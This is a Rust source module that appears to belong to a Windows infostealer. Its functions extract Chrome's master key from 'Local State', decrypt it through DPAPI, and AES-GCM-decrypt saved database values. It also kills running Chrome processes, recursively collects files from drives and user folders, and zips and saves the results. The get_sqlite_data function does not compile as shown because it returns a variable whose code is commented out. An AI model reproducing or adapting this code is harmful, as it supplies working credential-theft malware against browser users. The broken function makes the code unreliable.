use crate::structs::{SqlValue, WmiValue};
use aes_gcm::aead::{Aead, KeyInit};
use aes_gcm::{Aes256Gcm, Key, Nonce};
use base64::{self, Engine};
use dirs;
use json;
use json::JsonValue;
use std::collections::HashMap;
use std::fs;
use std::io::Write;
use std::path::PathBuf;
use winapi;
use wmi::{COMLibrary, WMIConnection};
use zip;

pub fn get_desktop_directory() -> PathBuf {
    let desktop_dir = dirs::desktop_dir().unwrap_or_default();

    desktop_dir
}

pub fn get_downloads_directory() -> PathBuf {
    let downloads_dir = dirs::download_dir().unwrap_or_default();

    downloads_dir
}

pub fn get_documents_directory() -> PathBuf {
    let documents_dir = dirs::document_dir().unwrap_or_default();

    documents_dir
}

pub fn get_temp_directory() -> PathBuf {
    std::env::temp_dir()
}

pub fn get_chrome_path() -> PathBuf {
    let chrome_path = dirs::data_local_dir()
        .unwrap_or_default()
        .join("Google\\Chrome\\User Data");

    chrome_path
}

pub fn get_drives() -> Vec<String> {
    let mut drives = Vec::new();

    for drive in 'A'..='Z' {
        let drive = format!("{}:", drive);
        let drive = PathBuf::from(drive);

        if drive.is_dir() {
            drives.push(drive.to_str().unwrap_or_default().to_string());
        }
    }

    drives
}

pub fn get_entries_from_directory(directory: &PathBuf) -> Vec<PathBuf> {
    let entries = match directory.read_dir() {
        Ok(entries) => entries,
        Err(_) => return Vec::new(),
    };

    let mut paths = Vec::new();

    for entry in entries {
        let entry = match entry {
            Ok(entry) => entry,
            Err(_) => continue,
        };

        let path = entry.path();

        paths.push(path);
    }

    paths
}

pub fn get_entries_from_directory_recursive(directory: &PathBuf) -> Vec<PathBuf> {
    let mut queue = Vec::new();
    let mut paths = Vec::new();

    queue.push(directory.clone());

    while !queue.is_empty() {
        let current_directory = queue.pop().unwrap_or_default();
        let entries = get_entries_from_directory(&current_directory);

        for entry in entries {
            if entry.is_dir() {
                queue.push(entry.clone());
            }

            paths.push(entry);
        }
    }

    paths
}

#[allow(dead_code)]
pub fn get_files_from_directory(directory: &PathBuf) -> Vec<PathBuf> {
    let entries = get_entries_from_directory(directory);

    let mut files = Vec::new();

    for entry in entries {
        if entry.is_file() {
            files.push(entry);
        }
    }

    files
}

#[allow(dead_code)]
pub fn get_files_from_directory_recursive(directory: &PathBuf) -> Vec<PathBuf> {
    let entries = get_entries_from_directory_recursive(directory);

    let mut files = Vec::new();

    for entry in entries {
        if entry.is_file() {
            files.push(entry);
        }
    }

    files
}

#[allow(dead_code)]
pub fn get_directories_from_directory(directory: &PathBuf) -> Vec<PathBuf> {
    let entries = get_entries_from_directory(directory);

    let mut directories = Vec::new();

    for entry in entries {
        if entry.is_dir() {
            directories.push(entry);
        }
    }

    directories
}

#[allow(dead_code)]
pub fn get_directories_from_directory_recursive(directory: &PathBuf) -> Vec<PathBuf> {
    let entries = get_entries_from_directory_recursive(directory);

    let mut directories = Vec::new();

    for entry in entries {
        if entry.is_dir() {
            directories.push(entry);
        }
    }

    directories
}

pub fn paths_to_strings(paths: Vec<PathBuf>) -> Vec<String> {
    let mut strings = Vec::new();

    for path in paths {
        let string_path = path.to_str().unwrap_or_default().to_string();
        strings.push(string_path);
    }

    strings
}

pub fn strings_to_paths(strings: Vec<String>) -> Vec<PathBuf> {
    let mut paths = Vec::new();

    for string in strings {
        let path = PathBuf::from(string);
        paths.push(path);
    }

    paths
}

pub fn query_wmi(query: &str) -> Vec<HashMap<String, wmi::Variant>> {
    fn execute_query(query: &str) -> Result<Vec<HashMap<String, wmi::Variant>>, wmi::WMIError> {
        let com_con = COMLibrary::new().map_err(wmi::WMIError::from)?;

        let wmi_con = WMIConnection::new(com_con.into())?;

        let results: Vec<HashMap<String, wmi::Variant>> = wmi_con.raw_query(query)?;

        Ok(results)
    }

    match execute_query(query) {
        Ok(results) => results,
        Err(_) => Vec::new(),
    }
}

pub fn get_decryption_key(key_path: &PathBuf) -> Result<Vec<u8>, Box<dyn std::error::Error>> {
    let encryption_key_path = key_path.join("Local State");

    let encryption_key = std::fs::read_to_string(encryption_key_path)?;
    let encryption_key = json::parse(&encryption_key)?;

    let encryption_key = encryption_key["os_crypt"]["encrypted_key"]
        .as_str()
        .unwrap_or_default();

    let encryption_key = base64::engine::general_purpose::STANDARD.decode(encryption_key)?;

    let encryption_key = &encryption_key[5..];
    let mut vec = encryption_key.to_vec();

    let mut p_data_in = winapi::um::wincrypt::CRYPTOAPI_BLOB {
        cbData: vec.len() as u32,
        pbData: vec.as_mut_ptr(),
    };

    let mut p_data_out = winapi::um::wincrypt::CRYPTOAPI_BLOB {
        cbData: 0,
        pbData: std::ptr::null_mut(),
    };

    unsafe {
        let success = winapi::um::dpapi::CryptUnprotectData(
            &mut p_data_in,
            std::ptr::null_mut(),
            std::ptr::null_mut(),
            std::ptr::null_mut(),
            std::ptr::null_mut(),
            0,
            &mut p_data_out,
        );

        if success == 0 {
            return Err("Failed to decrypt the encryption key".into());
        }

        let size: usize = p_data_out.cbData.try_into().unwrap_or_default();

        let mut result: Vec<u8> = Vec::with_capacity(size);
        result.as_mut_ptr().copy_from(p_data_out.pbData, size);
        result.set_len(size);

        winapi::um::winbase::LocalFree(p_data_out.pbData as *mut winapi::ctypes::c_void);

        Ok(result)
    }
}

pub fn get_sqlite_data(path: &PathBuf, query: &str) -> Vec<Vec<rusqlite::types::Value>> {
    let conn = match rusqlite::Connection::open(path) {
        Ok(conn) => conn,
        Err(err) => {
            println!("Failed to open the database: {}", err);

            return Vec::new();
        }
    };

    let mut stmt = match conn.prepare(query) {
        Ok(stmt) => stmt,
        Err(err) => {
            println!("Failed to prepare the statement: {}", err);

            return Vec::new();
        }
    };

    /*     let rows: rusqlite::Rows<'_> = match stmt.query([]) {
        Ok(rows) => rows,
        Err(err) => {
            println!("Failed to query the statement: {}", err);

            return Vec::new()
        },
    }; */

    /* fn map_rows(
        mut statement: rusqlite::Statement<'_>,
    ) -> Result<Vec<Vec<rusqlite::types::Value>>, rusqlite::Error> {
        let mut data = Vec::new();

        let _ = statement.query_map([], |row| {
            println!("{:?}", row.as_ref().column_count());
            let mut columns = Vec::new();
            let column_count = row.as_ref().column_count();

            for i in 0..column_count {
                let val = match row.get::<_, rusqlite::types::Value>(i) {
                    Ok(val) => val,
                    Err(_) => rusqlite::types::Value::Null,
                };

                columns.push(val);
            }

            data.push(columns.clone());

            Ok(columns)
        })?;

        Ok(data)
    }
 */
    /* let mut data = match map_rows(stmt) {
        Ok(data) => data,
        Err(err) => {
            println!("Failed to map the rows: {}", err);

            return Vec::new();
        }
    }; */

    /* let _ = rows.map(|row| {
        let mut columns = Vec::new();
        let column_count = row.as_ref().column_count();

        for i in 0..column_count {
            let val = match row.get::<_, rusqlite::types::Value>(i) {
                Ok(val) => val,
                Err(_) => rusqlite::types::Value::Null,
            };

            columns.push(val);
        }

        data.push(columns.clone());

        Ok(columns)
    }); */

    data
}

pub fn close_chome() -> Result<(), Box<dyn std::error::Error>> {
    let query = "SELECT * FROM Win32_Process WHERE Name = 'chrome.exe'";
    let processes = query_wmi(query);

    for process in processes {
        let process_id = match process.get("ProcessId") {
            Some(process_id) => process_id,
            _ => continue,
        };

        let process_id = match process_id {
            wmi::Variant::UI4(process_id) => process_id,
            _ => continue,
        };

        unsafe {
            let handle = winapi::um::processthreadsapi::OpenProcess(
                winapi::um::winnt::PROCESS_TERMINATE,
                0,
                process_id.clone(),
            );

            if handle.is_null() {
                continue;
            }

            winapi::um::processthreadsapi::TerminateProcess(handle, 0);
            winapi::um::handleapi::CloseHandle(handle);
        }
    }

    Ok(())
}

pub fn decrypt(data: &[u8], decryption_key: &[u8]) -> Result<String, Box<dyn std::error::Error>> {
    if data.is_empty() {
        return Ok("".into());
    }

    let nonce = &data[3..3 + 12];
    let cipherdata = &data[3 + 12..];

    let key = Key::<Aes256Gcm>::from_slice(&decryption_key);
    let nonce = Nonce::from_slice(&nonce);
    let cipher = aes_gcm::Aes256Gcm::new(&key);

    let decryption_result = cipher.decrypt(&nonce, cipherdata);

    match decryption_result {
        Ok(plaintext) => {
            let plaintext = String::from_utf8(plaintext)?;

            Ok(plaintext)
        }
        Err(_) => Err("Failed to decrypt the data".into()),
    }
}

pub fn decrypt_sql_value(value: Option<&rusqlite::types::Value>) -> SqlValue {
    let data = match value {
        Some(rusqlite::types::Value::Blob(data)) => data,
        _ => {
            return SqlValue {
                value: rusqlite::types::Value::Null,
            }
        }
    };

    let decryption_key = get_decryption_key(&get_chrome_path()).unwrap_or_default();
    let decrypted_data = decrypt(&data, &decryption_key).unwrap_or_default();

    SqlValue {
        value: rusqlite::types::Value::Text(decrypted_data),
    }
}

pub fn archive_files(
    files: &Vec<PathBuf>,
    archive_path: &PathBuf,
) -> Result<(), Box<dyn std::error::Error>> {
    let mut archive = zip::ZipWriter::new(std::fs::File::create(archive_path)?);

    for file in files {
        if !file.exists() {
            continue;
        }

        let file_name = file
            .file_name()
            .unwrap_or_default()
            .to_str()
            .unwrap_or_default();

        match archive.start_file(file_name, zip::write::FileOptions::default()) {
            Ok(_) => (),
            Err(_) => continue,
        }

        match std::io::copy(&mut std::fs::File::open(file)?, &mut archive) {
            Ok(_) => (),
            Err(_) => continue,
        }
    }

    archive.finish()?;

    Ok(())
}

pub fn get_sql_value(value: Option<&rusqlite::types::Value>) -> SqlValue {
    match value {
        Some(value) => SqlValue {
            value: value.clone(),
        },
        _ => SqlValue::default(),
    }
}

pub fn get_variant_value(variant: Option<&wmi::Variant>) -> WmiValue {
    match variant {
        Some(variant) => WmiValue {
            value: copy_variant(variant),
        },
        _ => WmiValue::default(),
    }
}

pub fn copy_variant(variant: &wmi::Variant) -> wmi::Variant {
    match variant {
        wmi::Variant::Null => wmi::Variant::Null,
        wmi::Variant::Empty => wmi::Variant::Empty,
        wmi::Variant::String(val) => wmi::Variant::String(val.clone()),
        wmi::Variant::Bool(val) => wmi::Variant::Bool(*val),
        wmi::Variant::Array(val) => {
            let mut new_arr = Vec::new();

            for v in val {
                new_arr.push(copy_variant(v));
            }

            wmi::Variant::Array(new_arr)
        }
        wmi::Variant::Object(val) => {
            let new_obj = val.clone();

            wmi::Variant::Object(new_obj)
        }
        wmi::Variant::I1(val) => wmi::Variant::I1(*val),
        wmi::Variant::I2(val) => wmi::Variant::I2(*val),
        wmi::Variant::I4(val) => wmi::Variant::I4(*val),
        wmi::Variant::I8(val) => wmi::Variant::I8(*val),
        wmi::Variant::UI1(val) => wmi::Variant::UI1(*val),
        wmi::Variant::UI2(val) => wmi::Variant::UI2(*val),
        wmi::Variant::UI4(val) => wmi::Variant::UI4(*val),
        wmi::Variant::UI8(val) => wmi::Variant::UI8(*val),
        wmi::Variant::R4(val) => wmi::Variant::R4(*val),
        wmi::Variant::R8(val) => wmi::Variant::R8(*val),
        _ => wmi::Variant::Null,
    }
}

pub fn get_variant_string(variant: Option<&wmi::Variant>) -> String {
    match variant {
        Some(wmi::Variant::String(s)) => s.clone(),
        _ => String::new(),
    }
}

pub fn save_data(data: &JsonValue, dest: &str) -> Result<(), std::io::Error> {
    let mut file = fs::File::create(dest)?;

    file.write_all(data.dump().as_bytes())?;

    Ok(())
}
